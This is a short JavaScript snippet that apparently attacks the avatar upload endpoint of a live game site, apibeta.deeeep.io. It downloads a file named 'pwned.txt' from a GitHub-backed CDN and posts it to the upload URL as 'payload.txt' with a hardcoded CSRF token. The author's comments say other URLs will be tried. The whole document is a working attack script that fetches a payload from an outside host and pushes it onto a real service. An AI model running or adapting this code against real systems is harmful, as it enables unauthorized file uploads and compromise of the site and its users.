const TargetUrl = 'https://apibeta.deeeep.io/users/uploadpic';
// I'm gonna try multiple URL's but I think this one is the best

const PayloadUrl = 'https://cdn.jsdelivr.net/gh/garsfaad0dnimym/wabshur_decreative/pwned.txt';
// Just a lil test



const token = 'ff26a2fd5d57418b3706470f009ad379';

const headers = {
'CSRF-Token': token,
};

fetch(PayloadUrl)
  .then(response => {
    if (!response.ok) {
      throw new Error(`Failed to fetch file: ${response.statusText}`);
    }
    return response.blob();
  })
  .then(blob => {
const formData = new FormData();
formData.append('file', blob, 'payload.txt');


return fetch(TargetUrl, {
  method: 'POST',
  body: formData,
headers: headers,
});
})
.then(response => response.json())
.then(data => {
  console.log('Server response:', data);
})
.catch(error => {
  console.error('Error:', error);
});
